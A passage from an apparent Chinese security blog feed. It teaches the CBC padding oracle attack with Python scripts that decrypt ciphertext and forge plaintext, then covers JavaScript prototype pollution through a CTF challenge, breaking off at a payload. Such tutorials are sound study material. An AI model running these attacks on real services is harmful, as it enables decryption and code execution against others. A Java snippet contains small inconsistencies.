<span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (plain != <span class="keyword">null</span> &amp;&amp; length != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> totalLength = Math.addExact(startIdx, length);</span><br><span class="line">        <span class="keyword">byte</span> tailVal = plain[totalLength - <span class="number">1</span>]; <span class="comment">// 解密后明文的最后一个字符</span></span><br><span class="line">        <span class="keyword">int</span> unsignedTailVal = tailVal &amp; <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">if</span> (unsignedTailVal &gt;= <span class="number">1</span> &amp;&amp; unsignedTailVal &lt;= <span class="keyword">this</span>.blockSize) &#123;</span><br><span class="line">            <span class="keyword">int</span> paddingStartIdx = totalLength - unsignedTailVal;</span><br><span class="line">            <span class="comment">// tailVal==unsignedTailVal</span></span><br><span class="line">            <span class="keyword">if</span> (paddingVal &lt; startIdx) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = paddingStartIdx; i &lt; totalLength; ++i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (plain[i] != tailVal) &#123;</span><br><span class="line">                        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> paddingVal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="推导原中间值"><a href="#推导原中间值" class="headerlink" title="推导原中间值"></a>推导原中间值</h1><p>假设<code>plain=123456789</code>，<code>key=keykeyke</code>，加密得到<code>iv(hexcoded)=c86518374d219a7e</code>,<code>secret(hexcoded)=c8c9c4f092468f9e75b520a3ea1832c0</code></p><p>作为攻击者，目前我们知晓的是iv和secret，攻击的第一步是调整iv得到中间值：</p><p><img src="/crypto-PaddingOracle攻击/1563019123084.png" alt="1563019123084"></p><p>抽取第一块出来看，如果我们调用<code>decode(&quot;c8c9c4f092468f9e&quot;,key,&quot;0000000000000000&quot;)</code>——再次注意，<strong>能控制的只有secret和iv，key变量未知也不可控</strong>，上文函数势必会报错，因为Padding不合法：</p><p><img src="/crypto-PaddingOracle攻击/1563075246744.png" alt="1563075246744"></p><p>那么此时（最可能）合法的Padding是什么呢？不难想到应该是0x01，即Plain Text &amp; Padding应该为”???????\x01“</p><h2 id="爆破辅助IV-1"><a href="#爆破辅助IV-1" class="headerlink" title="爆破辅助IV[-1]"></a>爆破辅助IV[-1]</h2><p>控制secret不变，IV清零，先爆破(合法的辅助)iv最后一位，若结束位为0x01则程序不再报错，反之程序报错（这里可以解释下上文说的“最可能”的含义，因为异或后有可能解密后plainText[-2]=0x02，那么合法的padding也可以是\0x02——也就是说结束位为0x02程序也不报错，也有可能plainText[-3]=plainText[-2]=0x03，那么合法的padding也可以是0x03，这样的概率出现的实在是太少了，即使是最后一个分组，由于我们已经清零了IV，因此也不会发生这种情况）。</p><p>因此有如下脚本，得到了合法的最后一位是“47”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_iv</span><span class="params">(secret: bytearray, iv: bytearray, pos: int)</span>-&gt;int:</span></span><br><span class="line">    <span class="keyword">for</span> iv_byte <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        iv[pos]=iv_byte</span><br><span class="line">        <span class="comment">#对java的函数的封装，当报错时返回-1。</span></span><br><span class="line">        ret=decode(secret, iv)</span><br><span class="line">        logging.info(<span class="string">"&#123;0&#125;::&#123;1&#125;"</span>.format(iv.hex(),ret))</span><br><span class="line">        <span class="keyword">if</span> ret!=<span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> iv_byte</span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075623114.png" alt="1563075623114"></p><h2 id="更新中间值"><a href="#更新中间值" class="headerlink" title="更新中间值"></a>更新中间值</h2><p>根据上文分析，我们猜测最后一位padding是<code>0x01</code>，并且<code>?^0x47=0x01</code>，那么<code>?=0x01^0x47=0x46</code>，由此中间值的最后一位就是<code>0x46</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">legal_iv_byte=burp_iv(secret, fake_legal_iv,i) <span class="comment"># 0x47</span></span><br><span class="line"><span class="comment"># 更新intermediary value</span></span><br><span class="line">intermedi_byte=padding^legal_iv_byte <span class="comment"># 0x01^0x47 </span></span><br><span class="line">intermedi[i]=intermedi_byte <span class="comment"># 0x46</span></span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075737764.png" alt="1563075737764"></p><h2 id="更新辅助IV"><a href="#更新辅助IV" class="headerlink" title="更新辅助IV"></a>更新辅助IV</h2><p>接下来推第二位，此时我们假设(最有可能的合法)padding值应该是0x02，首先让最后一位合法——<code>IV[-1]^0x46=0x02</code>，即更新<code>IV[-1]=0x02^0x46=0x44</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新iv</span></span><br><span class="line">padding+=<span class="number">1</span> <span class="comment"># padding=0x02</span></span><br><span class="line">legal_iv_byte=padding^intermedi_byte <span class="comment"># 0x44</span></span><br><span class="line">fake_legal_iv[<span class="number">-1</span>]=legal_iv_byte</span><br></pre></td></tr></table></figure><p><img src="/crypto-PaddingOracle攻击/1563075936620.png" alt="1563075936620"></p><h2 id="爆破辅助IV-2"><a href="#爆破辅助IV-2" class="headerlink" title="爆破辅助IV[:-2]"></a>爆破辅助IV[:-2]</h2><p>用爆破第一位的相同方法，得到第二位IV为0xAF，再得到第二位中间值为0xAD：</p><p><img src="/crypto-PaddingOracle攻击/1563074854405.png" alt="1563074854405"></p><p>再更新辅助IV爆破第三位，以此类推，可以整个中间值<code>f9572b037817ad46</code>：</p><p><img src="/crypto-PaddingOracle攻击/1563074654217.png" alt="1563074654217"></p><p>即最多花费<code>256*len(block)</code>次尝试，可以得到整个中间值，此时辅助IV的任务已经完成。</p><p>而此时，攻击者需要的只是<strong>secret</strong>和<strong>分组长度</strong>。</p><p>另外，不论对于哪一个分组（即使是最后一个填充分组），进行的操作都是一样的。</p><h1 id="推导原明文"><a href="#推导原明文" class="headerlink" title="推导原明文"></a>推导原明文</h1><p>知道中间值之后，由<code>Intermediary ^ IV = Plain</code> 推导原明文，注意这里是真实的IV，而不是之前的辅助IV。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp_plain</span><span class="params">(intermedi: bytearray, iv: bytearray)</span>-&gt;bytearray:</span></span><br><span class="line">    block_len=len(intermedi)</span><br><span class="line">    plain=bytearray.fromhex(<span class="string">"00"</span>*block_len)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(block_len):</span><br><span class="line">        plain[i]=intermedi[i]^iv[i]</span><br><span class="line">    logging.info(<span class="string">"Get Plain Value: &#123;&#125;"</span>.format(plain.hex()))</span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><p>对于第一个分组，IV就是初始IV；对于后面的分组，IV为上一分组的密文，以此可以推导全部明文：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(secret: bytearray, iv: bytearray)</span>-&gt;bytearray:</span></span><br><span class="line">    plain=bytearray()</span><br><span class="line">    block_len=len(iv)</span><br><span class="line">    real_iv=iv</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(secret),<span class="number">8</span>):</span><br><span class="line">        block_secret=secret[i:i+<span class="number">8</span>]</span><br><span class="line">        intermedi=burp_intermediary(block_secret, block_len)</span><br><span class="line">        plain+=burp_plain(intermedi, real_iv)</span><br><span class="line">        real_iv=secret[i:i+<span class="number">8</span>]</span><br><span class="line">    logging.info(<span class="string">"Get Full Plain: &#123;&#125;"</span>.format(plain.hex()))</span><br><span class="line">    <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><p>梳理一下，在知晓secret和iv的情况下，攻击者先推导中间值，接着推导原明文。</p><h1 id="伪造明文"><a href="#伪造明文" class="headerlink" title="伪造明文"></a>伪造明文</h1><p>推导出<strong>中间值</strong>后，可以伪造新明文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">∵ intermediary ^ new_iv = fake_plain</span><br><span class="line">∴ fake_iv=intermediary ^ fake_plain</span><br></pre></td></tr></table></figure><p>我们先构造一个长度在一个分组长度内的密文，比如“7654321”：</p><ol><li>PKCS#5填充，得到“7654321\x01”</li><li><code>new_iv=b&quot;\xf9\x57\x2b\x03\x78\x17\xad\x46&quot; ^ b&quot;7654321\x01&quot;=b&quot;\xce\x61\x1e\x37\x4b\x25\x9c\x47&quot;</code></li><li>decode(“c8c9c4f092468f9e”,key,“ce611e374b259c47”) = “7654321”</li></ol><p>代码实现如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_block</span><span class="params">(secret_block: bytearray, fake_plain: bytearray)</span>-&gt;(bytearray, bytearray):</span></span><br><span class="line">    block_len=len(secret_block)</span><br><span class="line">    <span class="keyword">if</span> len(fake_plain)&lt;block_len:</span><br><span class="line">        fake_plain=pkcs5(fake_plain, block_len)</span><br><span class="line"></span><br><span class="line">    intermedi=burp_intermediary(secret_block, block_len)</span><br><span class="line">    iv=bytearray(block_len) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(block_len):</span><br><span class="line">        iv[i]=intermedi[i]^fake_plain[i]</span><br><span class="line">    logging.info(<span class="string">"Fake IV: &#123;0&#125;, Secret: &#123;1&#125;"</span>.format(iv.hex(), secret_block.hex()))</span><br><span class="line">    <span class="keyword">return</span> iv, secret_block</span><br></pre></td></tr></table></figure></p><p>可以看到，算法输入实际上只有需要加密的<strong>明文</strong>（<strong>secret</strong>可以为任意值），输出实际上只有iv（secret原样返回）。</p><h2 id="伪造任意长度的明文"><a href="#伪造任意长度的明文" class="headerlink" title="伪造任意长度的明文"></a>伪造任意长度的明文</h2><p>根据CBC的解密流程，将最后一块加密产生的IV作为倒数第二块的secret，以前的倒数第i块IV作为倒数第i-1块的secret，依次向前算得所有密文，最后产生的IV作为初始IV。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(plain: bytearray, block_len: int)</span>-&gt;bytearray:</span></span><br><span class="line">    idxs=list(range(<span class="number">0</span>, len(plain), block_len))</span><br><span class="line">    secret=bytearray()</span><br><span class="line">    secret_block=bytearray(block_len)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> idxs[::<span class="number">-1</span>]:</span><br><span class="line">        iv, secret_block=encrypt_block(secret_block, plain[idx:idx+<span class="number">8</span>])</span><br><span class="line">        secret=secret_block+secret</span><br><span class="line">        secret_block=iv</span><br><span class="line"></span><br><span class="line">    logging.info(<span class="string">"IV: &#123;0&#125;, Secret: &#123;1&#125;"</span>.format(iv.hex(), secret.hex()))</span><br><span class="line">    <span class="keyword">return</span> iv, secret</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整理一下，在攻击者知晓加密方式为AES/DES-CBC，密文以及初始化向量长度后，可以解密原中间值；攻击者知晓密文以及初始化向量值后，可以进一步解密原明文；攻击者在只知晓加密方式为AES/DES-CBC情况下，可以伪造明文，当然整个大前提是攻击者可以多次调用解密程序，并且解密程序在padding不合法时报错。</p><p><strong>代码：</strong><a href="https://github.com/Anemone95/padding-oracle-attack" target="_blank" rel="noopener">https://github.com/Anemone95/padding-oracle-attack</a></p><h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1><ol><li>Automated Padding Oracle Attacks With PadBuster，<a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html" target="_blank" rel="noopener">https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html</a></li><li>Padding Oracle，<a href="https://www.jianshu.com/p/1851f778e579" target="_blank" rel="noopener">https://www.jianshu.com/p/1851f778e579</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CBC加密原理&quot;&gt;&lt;a href=&quot;#CBC加密原理&quot; class=&quot;headerlink&quot; title=&quot;CBC加密原理&quot;&gt;&lt;/a&gt;CBC加密原理&lt;/h1&gt;&lt;p&gt;先预习下CBC的加解密原理吧。&lt;/p&gt;
&lt;h2 id=&quot;加密&quot;&gt;&lt;a href=&quot;#加密&quot; clas
      
    
    </summary>
    
      <category term="密码学" scheme="http://anemone.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="http://anemone.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
      <category term="CBC" scheme="http://anemone.top/tags/CBC/"/>
    
      <category term="PaddingOracle" scheme="http://anemone.top/tags/PaddingOracle/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript原型链污染学习笔记</title>
    <link href="http://anemone.top/JS-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://anemone.top/JS-原型链污染/</id>
    <published>2019-05-05T13:14:20.000Z</published>
    <updated>2019-09-22T10:14:18.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a><code>prototype</code>和<code>__proto__</code></h1><h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><code>prototype</code></h2><p>Javascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.bar = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Foo.prototype.show = <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.bar)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> Foo()</span><br><span class="line">foo.show()</span><br></pre></td></tr></table></figure><h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h2><p><code>prototype</code>只能在类（换句话说，构造函数）上使用，如果想在实体化的类上使用则需要使用<code>__proto__</code>属性，即：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.__proto__.show == Foo.prototype.show</span><br></pre></td></tr></table></figure><h1 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h1><p>子类将其prototype赋值为一个父类对象实例，表示其继承父类。对于子对象的属性，若其不存在，则会递归查找其父对象，举例说明：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Father</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Donald'</span></span><br><span class="line">    <span class="keyword">this</span>.last_name = <span class="string">'Trump'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Son</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.first_name = <span class="string">'Melania'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = <span class="keyword">new</span> Father()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> Son()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>) <span class="comment">//输出Melania Trump</span></span><br></pre></td></tr></table></figure><p>对于对象son，在调用<code>son.last_name</code>的时候，实际上JavaScript引擎会进行如下操作：</p><ol><li>在对象son中寻找last_name</li><li>如果找不到，则在<code>son.__proto__</code>中寻找last_name</li><li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找last_name</li><li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li></ol><h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>考虑以下情况，如果使用<code>son.__proto__.name=&quot;son&quot;</code>，那么会造成<code>daughter.name=son</code></p><p><img src="/JS-原型链污染/uml.svg" alt="uml"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// son是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> son = &#123;<span class="attr">name</span>: <span class="string">"mike"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// son.name="mike"</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改son的原型（即Object）</span></span><br><span class="line">son.__proto__.name = <span class="string">"poison"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(son.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> daughter = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看daughter.name(daughter.name="poison")</span></span><br><span class="line"><span class="built_in">console</span>.log(daughter.name)</span><br></pre></td></tr></table></figure><p><code>foo.__proto__==zoo.__proto__==object</code></p><h2 id="发生场景"><a href="#发生场景" class="headerlink" title="发生场景"></a>发生场景</h2><p>js中的merge、clone操作：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>失败的利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p><p>成功的利用：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure></p><p><strong>解释:</strong><br>失败利用的<code>__proto__</code>实际上是使o2的<code>__proto__</code>为<code>{b:2}</code>，即<code>o2.__proto__={b:2}</code>，这样<code>for</code>遍历时指挥遍历<code>a,b</code>，而不会遍历到<code>__proto__</code>。</p><p><img src="/JS-原型链污染/1556024722140.png" alt="1556024722140"></p><p>成功方法的JSON.parse会使o2的<code>__proto__</code>为一个普通的键名称，所以在<code>let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)</code>后o2的原型是没有b属性的，而在merge后会将o2的原型（object）增加一个b属性。</p><p><img src="/JS-原型链污染/1556025479492.png" alt="1556025479492"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>参考p神出的<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js" target="_blank" rel="noopener">Code-Breaking 2018 Thejs</a> 题目：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content) <span class="comment">//source</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">        language: data.language,</span><br><span class="line">        category: data.category</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>source，用户输入的body传入merge方法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lodash.merge(data, req.body)</span><br></pre></td></tr></table></figure></p><p>sink为<a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165" target="_blank" rel="noopener">lodash.template()</a>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'sourceURL'</span> <span class="keyword">in</span> options ? <span class="string">'//# sourceURL='</span> + options.sourceURL + <span class="string">'\n'</span> : <span class="string">''</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">  .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数，举例子更好说明：</p><p><img src="/JS-原型链污染/1556109443518.png" alt="1556109443518"></p><p>Function.apply(object, args)可以调用该函数，可以理解为<code>object.function(arg1, arg2)，args=[arg1, arg2]</code>，例如：</p><p><img src="/JS-原型链污染/1556110289896.png" alt="1556110289896"></p><p>再解释一下attempt：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> attempt = baseRest(<span class="function"><span class="keyword">function</span>(<span class="params">func, args</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> apply(func, <span class="literal">undefined</span>, args);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> isError(e) ? e : <span class="keyword">new</span> <span class="built_in">Error</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以看到attempt的输入参数是(func[,args])，考虑到js特性——假设function(arg1,arg2,arg3)定义的函数有三个参数，其调用时参数个数可以小于3，实际相当于<code>func.apply()</code>。</p><h2 id="有缺陷的Payload"><a href="#有缺陷的Payload" class="headerlink" title="有缺陷的Payload"></a>有缺陷的Payload</h2><p>根据上面的分析，可以通过原型污染到object，使options也有sourceURL属性，构造出如下的payload：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 